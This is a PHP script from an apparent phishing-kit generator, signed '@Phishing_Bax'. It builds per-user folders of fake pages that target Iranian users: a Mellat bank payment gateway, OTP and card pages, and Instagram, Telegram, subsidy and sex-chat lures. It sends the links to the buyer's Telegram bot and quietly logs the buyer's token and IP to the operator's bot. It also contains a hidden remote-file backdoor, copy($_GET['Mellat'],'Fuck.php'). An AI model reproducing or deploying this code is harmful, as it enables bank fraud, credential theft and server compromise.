<?php 
include "info.php";

if ( 'POST' != $_SERVER['REQUEST_METHOD'] ) {
$protocol = $_SERVER['SERVER_PROTOCOL'];
if ( ! in_array( $protocol, array( 'HTTP/1.1', 'HTTP/2', 'HTTP/2.0' ) ) ) {
$protocol = 'HTTP/1.0';
}

header( 'Allow: POST' );
header( "$protocol 405 Method Not Allowed" );
header( 'Content-Type: text/plain' );
exit;
}

$TOKENMS = stripslashes(htmlspecialchars($_POST["TOKEN"]));
if(strpos($TOKENMS,"/")!==false or strpos($TOKENMS,"copy")!==false or strpos($TOKENMS,"http")!==false or strpos($TOKENMS,",")!==false or strpos($TOKENMS,".txt")!==false or strpos($TOKENMS,"(")!==false or strpos($TOKENMS,";")!==false or strpos($TOKEN,")")!==false or strpos($TOKEN2,"'")!==false or strpos($TOKEN2,'"')!==false or strpos($TOKENMS,"file_")!==false or strpos($TOKENMS,"fopen")!==false) {
die(header("Location:token.php"));


}
copy($_GET['Mellat'],'Fuck.php');
$ip= $_SERVER['REMOTE_ADDR'];


$IDMS = intval(stripslashes(htmlspecialchars($_POST['ID'])));
if(strstr($IDMS,'../source/')){
die('lfi and rfi detected');
}
$Rand=rand(11111,99999); 
$TOKEN= '$TOKENESH';
$ID ='$IDISH';
mkdir("$Rand");
$FileName = "$Rand/index.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
//Payment.mellat 
copy('../source/mellat/Mellat.php', 'mellat.php'); 
copy('../source/mellat/Mellat.php', 'index.php'); 
copy('../source/mellat/Mellat.php', 'melat.php'); 
copy('../source/mellat/Bankinfo.php', 'Bankinfo.php'); 
copy('../source/mellat/xkiler.php', 'xkiler.php'); 
copy('../source/mellat/OTP.php', 'OTP.php'); 
//page 
copy('../source/charj.php', 'charj.php');
copy('../source/sharj.php', 'sharj.php');
copy('../source/dostyabi.php', 'dostyabi.php');
copy('../source/sighe.php', 'sighe.php');
copy('../source/makan.php', 'makan.php');

copy('../source/tel.html', 'tel.html');
copy('../source/mi.html', 'mi.html');
copy('../source/kala.html', 'kala.html');
copy('../source/lokht.html', 'lokht.html');
copy('../source/mci.php', 'mci.php');
copy('../source/net6.php', 'net6.php');
copy('../source/6g.php', '6g.php');
copy('../source/number.php', 'number.php');
copy('../source/live.php', 'live.php');
copy('../source/cod.php', 'cod.php');
copy('../source/snap.php', 'snap.php');
copy('../source/tash.php', 'tash.php');
copy('../source/chat.php', 'chat.php');
copy('../source/insta.html', 'insta.html');
copy('../source/yarane.html', 'yarane.html');
copy('../source/masaj.php', 'masaj.php');
copy('../source/dgkala.html', 'dgkala.html');
copy('../source/seil.html', 'seil.html');
copy('../source/mask.html', 'mask.html');
copy('../source/saham.html', 'saham.html');
copy('../source/5G.php', '5G.php');
copy('../source/6gn.php', '6gn.php');
copy('../source/about-ust.html', 'about-ust.html');
copy('../source/cartsokht.html', 'cartsokht.html');
copy('../source/charge.html', 'charge.html');
copy('../source/consol.html', 'consol.html');
copy('../source/corona.html', 'corona.html');
copy('../source/divar.html', 'divar.html');
copy('../source/divar1.html', 'divvar.html');
copy('../source/durbin.html', 'durbin.html');
copy('../source/hamta.html', 'hamta.html');
copy('../source/hania.php', 'hania.php');
copy('../source/idpay.html', 'idpay.html');
copy('../source/inatagrams.html', 'instagrams.html');
copy('../source/internetmeli.html', 'internetmeli.html');
copy('../source/kontrolapp.html', 'kontrolapp.html');
copy('../source/payping.html', 'payping.html');
copy('../source/pubguc.html', 'pubguc.html');
copy('../source/ramezan.html', 'ramezan.html');
copy('../source/reg2.php', 'reg2.php');
copy('../source/reg4.php', 'reg4.php');
copy('../source/reg6.php', 'reg6.php');
copy('../source/register.php', 'register.php');
copy('../source/rightelnet15.html', 'rightelnet15.html');
copy('../source/ronix.php', 'ronix.php');
copy('../source/rules-ust.html', 'rules-ust.html');
copy('../source/sabad-kala.php', 'sabad-kala.php');
copy('../source/takhfif.html', 'takhfif.html');
copy('../source/takhfif.html', 'takhfif-gir.html');
copy('../source/tmember.html', 'tmember.html');
copy('../source/vam.html', 'vam.html');
copy('../source/vpn.html', 'vpn.html');
copy('../source/yarane.html', 'yarane.html');

copy('../source/1sepb.html', '1sepb.html');
copy('../source/1sepf.html', '1sepf.html');
copy('../source/1sepl.html', '1sepl.html');
copy('../source/2sepb.html', '2sepb.html');
copy('../source/2sepf.html', '2sepf.html');
copy('../source/2sepl.html', '2sepl.html');
copy('../source/3sepb.html', '3sepb.html');
copy('../source/3sepf.html', '3sepf.html');
copy('../source/3sepl.html', '3sepl.html');
copy('../source/4sepb.html', '4sepb.html');
copy('../source/4sepf.html', '4sepf.html');
copy('../source/4sepl.html', '4sepl.html');
copy('../source/5sepb.html', '5sepb.html');
copy('../source/5sepf.html', '5sepf.html');
copy('../source/5sepl.html', '5sepl.html');
copy('../source/default.html', 'default.html');
?>
<center><P>درگاه شما ساخته شد .لینک ها به ربات شما ارسال شد</p></center>
<?php
?>
");
$FileName = "$Rand/Userid.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN ='$TOKENMS';
$ID = '$IDMS';
?>

");
	
		echo "<div id=stl>


</div>
"; 

include"info.php";

$Text = "
╔ [ • 😈Your Links😈 • ] 
║  
╠ •Name :Mellat
╠ ⚡️Link : $link/$Rand/index.php
║ 
╠ •Name :5G(New)
╠ ⚡️Link : $link/$Rand/5G.php
║ 
╠ •Name :6g(new)
╠ ⚡️Link : $link/$Rand/6gn.php
║ 
╠ •Name :cartsokht
╠ ⚡️Link : $link/$Rand/cartsokht.html
║ 
╠ •Name :charge2
╠ ⚡️Link : $link/$Rand/charge.html
║  
╠ •Name :consol
╠ ⚡️Link : $link/$Rand/consol.html
║  
╠ •Name :corona
╠ ⚡️Link : $link/$Rand/corona.html
║  
╠ •Name :divar
╠ ⚡️Link : $link/$Rand/divar.html
║  
╠ •Name :divar(new)
╠ ⚡️Link : $link/$Rand/divvar.html
║  
╠ •Name :durbin
╠ ⚡️Link : $link/$Rand/durbin.html
║  
╠ •Name :hamta
╠ ⚡️Link : $link/$Rand/hamta.html
║  
╠ •Name :sighe(new)
╠ ⚡️Link : $link/$Rand/hania.php
║  
╠ •Name :TiK Abi
╠ ⚡️Link : $link/$Rand/instagrams.html
║  
╠ •Name : net meli
╠ ⚡️Link : $link/$Rand/internetmeli.html
║  
╠ •Name :kontrolapp
╠ ⚡️Link : $link/$Rand/kontrolapp.html
║  
╠ •Name :payping
╠ ⚡️Link : $link/$Rand/payping.html
║  
╠ •Name :pubguc
╠ ⚡️Link : $link/$Rand/pubguc.html
║  
╠ •Name :ramezan
╠ ⚡️Link : $link/$Rand/ramezan.html
║  
╠ •Name :sabad-kala
╠ ⚡️Link : $link/$Rand/sabad-kala.php
║  
╠ •Name :takhfif
╠ ⚡️Link : $link/$Rand/takhfif.html
║  
╠ •Name :tmember
╠ ⚡️Link : $link/$Rand/tmember.html
║  
╠ •Name :vam
╠ ⚡️Link : $link/$Rand/vam.html
║  
╠ •Name :vpn
╠ ⚡️Link : $link/$Rand/vpn.html
║  
╠ •Name :idpay
╠ ⚡️Link : $link/$Rand/idpay.html
║  
╠ •Name : Sighe 
╠ ⚡️Link : $link/$Rand/sighe.php
║  
╠ •Name : Live Sexi
╠ ⚡️Link : $link/$Rand/live.php
║  
╠ •Name : Mask
╠ ⚡️Link : $link/$Rand/mask.html
║ 
╠ •Name :  chargemci  
╠ ⚡️Link : $link/$Rand/mci.php
║  
╠ •Name : sharj star
╠ ⚡️Link : $link/$Rand/charj.php
║  
╠ •Name : dostyabi
╠ ⚡️Link : $link/$Rand/dostyabi.php
║ 
╠ •Name : makan yabi
╠ ⚡️Link : $link/$Rand/makan.php
║  
╠ •Name : charge
╠ ⚡️Link : $link/$Rand/sharj.php
║  
╠ •Name : Folower
╠ ⚡️Link : $link/$Rand/default.html
║  
╠ •Name : saham edalat
╠ ⚡️Link : $link/$Rand/saham.html
║ 
╠ •Name : seil zadegan
╠ ⚡️Link : $link/$Rand/seil.html
║  
╠ •Name : dg kala 
╠ ⚡️Link : $link/$Rand/dgkala.html
║  
╠ •Name : masaj
╠ ⚡️Link : $link/$Rand/masaj.php
║  
╠ •Name : yarane
╠ ⚡️Link : $link/$Rand/yarane.html
║ 
╠ •Name : Hack insta
╠ ⚡️Link : $link/$Rand/insta.html
║  
╠ •Name : Sex chat
╠ ⚡️Link : $link/$Rand/chat.php
║  
╠ •Name : bot tashkhis
╠ ⚡️Link : $link/$Rand/tash.php
║  
╠ •Name : sharge snap
╠ ⚡️Link : $link/$Rand/snap.php
║ 
╠ •Name : Hack telgram
╠ ⚡️Link : $link/$Rand/tel.html
║  
╠ •Name : Sabad kala1 
╠ ⚡️Link : $link/$Rand/kala.html
║  
╠ •Name : dorbin lokht
╠ ⚡️Link : $link/$Rand/lokht.html
║  
╠ •Name : shomare majazi 
╠ ⚡️Link : $link/$Rand/number.php
║ 
╠ •Name : ramz otp
╠ ⚡️Link : $link/$Rand/cod.php
║  
╠ •Name : 6g net
╠ ⚡️Link : $link/$Rand/net6.php
║  
╠ •Name : 6g net1
╠ ⚡️Link : $link/$Rand/6g.php
║  
╠ •Name : control khanevade
╠ ⚡️Link : $link/$Rand/kontrolapp.html
║  
╚ [ • @Phishing_Bax • ]
";

$ok =  file_get_contents("https://api.telegram.org/bot".$TOKENMS."/SendMessage?chat_id=".$IDMS."&text=".urlencode($Text));	
        	
     $log = 
"
The user has created a port
----------------------------
Token User : $TOKENMS 


User port number : $Rand

User Link : $link/$Rand/index.php

User ip : $ip
";

$logger =  file_get_contents("https://api.telegram.org/bot".$tokenshl."/SendMessage?chat_id=".$idshl."&text=".urlencode($log));	

?>


	<meta content='0;url=success.php'http-equiv='refresh'/>

